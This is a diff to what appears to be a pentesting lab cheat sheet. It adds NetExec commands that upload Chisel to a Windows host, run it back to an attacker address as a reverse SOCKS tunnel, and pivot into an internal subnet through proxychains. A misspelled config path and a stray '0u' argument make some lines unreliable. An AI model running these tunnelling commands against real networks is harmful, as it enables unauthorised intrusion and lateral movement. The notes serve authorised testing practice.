@@ -210,6 +210,43 @@ nxc smb $IP -u [user] -p [pass] -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOG
 #### Scenario
 ![network unreachable diagrom](images/network-unreachable.jpg)
 
+#### Setup the Tunnel using [Chisel](https://github.com/jpillora/chisel)
+##### Reverse Tunnel
+* Setup up the listener on attack host
+```bash
+./chisel server --reverse
+```
+* Upload and execute chisel using nxc
+```bash
+nxc smb 10.129.204.133 -u [user] -p [pass] --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe
+nxc smb 10.129.204.133 -u [user] -p [pass] -x 'C:\Windows\Temp\chisel.exe client [attacker ip:port] R:socks'
+```
+* Configure Proxychains to use chisel
+```bash
+# Add the following to the end of /etc/proxychians4.conf:
+socks5  127.0.0.1 1080
+```
+* Test the configuration
+```bash
+sudo proxychains4 -q nxc smb 172.16.1.10 -u [user] -p [pass] --shares
+```
+* kill the chisel client
+```bash
+nxc smb $IP -u [user] -p [pass] -X 'Stop-Process -Name chisel -Force'
+```
+##### Windows as the server with linux client
+* Setup the listener on the pivot host
+```bash
+nxc smb $IP -u [user] -p [pass] -x 'C:\Windows\Temp\chisel.exe server --socks5'
+```
+* Connecting from the attack host
+```bash
+sudo chisel client $IP:8080 socks
+```
+* Test
+```bash
+sudo proxychains4 -q nxc smb $IP 0u -u [user] -p [pass] --shares
+```
 
 ## Admin Credentialed enumeration
 
